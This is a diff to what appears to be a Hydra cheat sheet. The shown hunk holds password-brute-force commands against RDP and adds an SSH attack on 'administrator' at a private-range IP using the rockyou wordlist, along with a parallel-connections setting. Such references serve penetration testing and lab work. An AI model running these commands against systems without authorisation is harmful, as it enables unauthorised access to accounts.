@@ -31,6 +31,9 @@ hydra -P <wordlist> -v <ip> <protocol>
 Attack a Windows Remote Desktop with a password list.
 hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>
 
+Number of parallel connections per target  -t 16
+hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.30.60 ssh
+
 
 
 
